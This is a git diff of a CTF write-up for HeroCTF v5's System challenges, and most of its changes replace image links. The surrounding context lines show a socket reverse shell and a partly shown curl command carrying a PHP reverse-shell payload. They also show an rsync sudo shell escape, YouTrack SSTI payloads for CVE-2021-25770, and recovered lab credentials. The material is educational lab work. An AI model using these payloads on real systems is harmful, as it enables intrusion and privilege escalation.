@@ -6,8 +6,8 @@ tags: CTF, HeroCTF, System, Enumeration, lateralmovement, CyberSecurity, pentest
 
 # HeroCTF v5 - System Collection
 
-![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e6687cde-357a-4ac3-8dae-62c6c7b29440)
-![Scoreboard](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ea48e388-04ac-479c-9608-331288b4c12f)
+![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e39446f8-11dd-49c4-9b8d-eb3774df2a53)
+![Scoreboard](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/11f0a23b-9729-4af4-9392-d727a2b794d3)
 
 > Written by [V0lk3n](https://twitter.com/V0lk3n)
 
@@ -157,11 +157,11 @@ A quick look to ```GTFObins```, and we found how to abuse the `socket` binary to
 
 Source : https://gtfobins.github.io/#socket
 
-![1-GTFObin](https://github.com/V0lk3n/V0lk3n.github.io/blob/main/writeup/HeroCTFv5/assets/SUDOkLu/1-GTFObin.png?raw=true)
+![1-GTFObin](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/35fb0f5e-c499-4ac4-99ac-fb7afcc75667)
 
 Let's exploit it. First open another ssh access to the target, and run a netcat listener on it. Then on the other ssh instance, run the `socket` command as `privilegeduser`.
 
-![2-access](https://github.com/V0lk3n/V0lk3n.github.io/blob/main/writeup/HeroCTFv5/assets/SUDOkLu/2-access.png?raw=true)
+![2-access](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6b1aa1ad-b132-4f44-909a-4f8d446ef806)
 
 Nice, we get a shell back as `privilegeduser` user. Finally read the flag.
 
@@ -375,15 +375,15 @@ http://127.0.0.1:8080/
 
 We are redirected to a YouTrack Dashboard where we are very limited if we doesnt log in. So let's log in as Dev with the given credentials into `welcome.txt` note (`dev:aff6d5527753386eaf09`).
 
-![1-LoginYouTrackDev](https://github.com/V0lk3n/V0lk3n.github.io/blob/main/writeup/HeroCTFv5/assets/LFM/1-LoginYouTrackDev.png?raw=true)
+![1-LoginYouTrackDev](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3d896c70-16bb-45b2-8d20-e9611f8e8692)
 
 Once logged in. Let's first look at the issues list.
 
-![2-YouTrack_Issue](https://github.com/V0lk3n/V0lk3n.github.io/blob/main/writeup/HeroCTFv5/assets/LFM/YouTrack_Issue.png?raw=true)
+![2-YouTrack_Issue](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/669529a4-3171-47ef-82ab-87bc20d82493)
 
 We will examine all of them in the next challenge. First let's open the issue `ST-5 Is that...`
 
-![3-Flag](https://github.com/V0lk3n/V0lk3n.github.io/blob/main/writeup/HeroCTFv5/assets/LFM/Flag.png?raw=true)
+![3-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/32696e79-284c-4d4c-96a2-2d55f05c4fd8)
 
 Is that a flag? YES! It is! 
 
@@ -415,17 +415,18 @@ The first one is a glitches where the username is out of the screen when opening
 
 The second said that there is an RCE in the app, and it give the URL location of the RCE. But if you highligh the link, you notice that it redirect to YouTube! Have a nice Rick Roll!
 
-![4-RickRoll](/assets/LFM/RickRoll.png?raw=true)
+![4-RickRoll](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0d0c0595-577b-46c2-bf37-44d9ec7bbb07)
+
 
 The third is a lot interesting. The admin is asking for an utility to access backup logs, he said that he found a snippet of code and edited the log file path in it so the file should be ready to push. 
 
-![5-Backup_tool](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/b28d5ff5-39d3-4aea-b04f-e3a91685b1c4)
+![5-Backup_tool](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/16c77c52-27ae-4880-a84b-cd2f940f27a1)
 
 We can see the code as attachment and the `dev` acount answer that he push the code. 
 
 Download the code for later, and let's examine the last issue.
 
-![6-wedontcaredude](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/89dc0810-0e17-403d-a6f9-8d94b6bd6e79)
+![6-wedontcaredude](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/adad51d4-46cd-421a-b6b9-ac409f1512cc)
 
 Not useful, let's come back to our previous download code called ```log_checker.php```.
 
@@ -604,7 +605,7 @@ bob@dev:~$ curl "http://backup/?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock
 
 And we got a shell on backup machine!
 
-![7-Shell_Backup](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/26911764-8955-4e04-a975-6edcc245e8d1)
+![7-Shell_Backup](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/39e30cdf-ba11-479a-9aff-2c51a96eb42c)
 
 Import the TTY, and look if we can do something with sudo.
 
@@ -625,7 +626,7 @@ We can use ```rsync``` with ```sudo``` as ```backup``` user. Let's go to GTFObin
 
 Source : https://gtfobins.github.io/#rsync
 
-![8-Privesc](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/51750adc-2069-46e2-9159-bb7047c7b537)
+![8-Privesc](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/1fa8be73-f001-411a-a543-317b3e989049)
 
 Great! We can escalate our privilege to user backup! Let's do it.
 
@@ -633,7 +634,7 @@ Great! We can escalate our privilege to user backup! Let's do it.
 sudo -u backup /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 ```
 
-![9-backup_shell](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3135d87a-9156-4f04-a661-a2c453ce9e3f)
+![9-backup_shell](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2e34048b-0ed6-46b0-8f87-54178cd922a6)
 
 Once again, import the TTY and start to enumerate the new machine.
 
@@ -645,7 +646,7 @@ backup@backup:/var/www/html$
 
 After looking around, we notice a backup directory at the root of the machine.
 
-![10-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e878f25a-f627-4e5a-b43e-30cd61616984)
+![10-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/20ecd8eb-85ee-4e40-9210-8b6f96e0ed8a)
 
 And we got the flag!
 
@@ -740,13 +741,13 @@ Now we got full takeover on YouTrack. We start to look which new features we can
 
 We notice a Notification Template, which seem interesting, but at first look there is nothing.
 
-![11-Notification_Menu](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/b62911a3-e7f7-46b1-8e4c-9ad1fa208795)
+![11-Notification_Menu](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8370b127-691c-4294-be03-0fc0d612136c)
 
-![12-Notification_Templates](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/91552419-6849-46d4-8dc4-44bba0c70182)
+![12-Notification_Templates](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c5faac07-44a9-4157-810e-708002667e40)
 
 Let's Google if our Jetbrains YouTrack instance is vulnerable to something. You can find the version at the bottom of the page in the dashboard home page.
 
-![13-YouTrack_Version](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6c157fa9-5045-492d-b500-b29191a5b7b7)
+![13-YouTrack_Version](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d7ecf937-1f76-4cd4-8c06-25eccdc3c772)
 
 After a quick google search `YouTrack Exploit`, we find this blog post about how to exploit `CVE-2021-25770` which is a Server Side Template Injection vulnerability on YouTrack.
 
@@ -756,11 +757,11 @@ Source : https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-serv
 
 First, we will test if the SSTI vulnerability is not patched. For it, firs load one of the existing notification template.
 
-![14-Load_Notification](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/cbe49250-b16d-46d6-abce-44d20eccc9e0)
+![14-Load_Notification](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/dea41fc1-a975-4c80-8f59-62a763cbafd5)
 
 Now let's try to do the classic calcul `7*7` and let's see if the console return us the result.
 
-![15-SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ff314ab2-4138-4103-b951-7eb3bf510eca)
+![15-SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/838f41e1-e2ba-4460-b7c7-dbc33be17a46)
 
 Perfect! Let's execute some commands
 
@@ -772,7 +773,7 @@ Perfect! Let's execute some commands
 ${dwf.newInstance(ec,null)("id")}
 ```
 
-![16-Exploit_SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/269217ab-426f-4d26-bd5a-e072c6cd27ab)
+![16-Exploit_SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6d804f4e-9ad9-4328-a873-1a3cf9cbe49b)
 
 Now repeat the process to enumerate the machine. We start to list the files in the Dave home directory.
 
@@ -780,11 +781,11 @@ Now repeat the process to enumerate the machine. We start to list the files in t
 ${dwf.newInstance(ec,null)("ls /home/dave/")}
 ```
 
-![17-LocateFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/9d03eaf7-6fb0-4918-8577-285f2c1f6318)
+![17-LocateFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3d9a0264-c81a-498d-8307-b45b99519dd9)
 
 We find the flag! Let's read it's content.
 
-![18-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5b593984-b803-4ed6-bc67-4d76ef424f82)
+![18-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/52d4b617-85fa-4f4a-a686-1c19ce0c176e)
 
 Flag : **Hero{pl41nt3xt_p4ssw0rd_4nd_s5t1_b1t_much_41nt_1t?}**
 
@@ -807,7 +808,7 @@ One more step to go!
 
 Once the Dave user home directory, we found the previous flag but we seen also a file called `randomfile.txt.enc`.
 
-![21-encoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/33f7733a-c149-4ea0-ba0b-a2f759b310e7)
+![21-encoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/47a5fa74-540c-430c-8b73-a2994d975ca5)
 
 As we remember our initial goal, Dave is selling customer information and we need to get proof of that. As this is the final challenge, this encrypted file should be our proof.
 
@@ -815,9 +816,9 @@ We need to know which algorythm was used to encrypt the data and also if a passw
 
 The title hint on this way, but of course it's the first thing we will look, the shell history! In our case it's bash, so let's read it.
 
-![19-bash_history](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f896c0cf-13b5-467a-ae7d-baad597248c8)
+![19-bash_history](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c9887d75-9f3b-4915-bab4-fc1edd571544)
 
-![20-EncodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/948fcfa7-f0a1-4fd2-a62a-f717e17ddffc)
+![20-EncodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5a2ac56a-5ba6-45ee-85a9-27d79e16b3e8)
 
 ```
 dave@$vps:~/toSendToBuyer.txt openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
@@ -831,13 +832,13 @@ Now let's decrypt the content.
 $ openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in /home/dave/randomfile.txt.enc -out /home/dave/randomfile.txt
 ```
 
-![22-DecodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e438d503-7af8-4a05-a67e-aa0adedd7f76)
+![22-DecodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/1ff370cb-dc54-4b05-90e2-69012111c2ef)
 
 And finally read it's content.
 
-![23-decoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0033bc47-6af8-42f2-bf9c-9b36c637dd33)
+![23-decoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d6f17ca8-ac58-4974-92cd-957727b61e91)
 
-![24-flag_final](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4e3666c0-7301-4f38-beaa-a42ad2c5ca64)
+![24-flag_final](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/93e533a9-1e70-43d9-adff-7edec1394b1d)
 
 ```
 Here is a sample of the hashes I dumped from the database, in good faith. 
@@ -874,4 +875,4 @@ Special thanks to :
 And of course... 
 
 **Thanks to my team [Godzillhack!](https://godzillhack.com)**
-![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8ec11c6e-f1d3-4e9a-8f70-6b7384535e14)
+![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4c81af26-3b14-4d60-a8a4-0ac50da443f7)
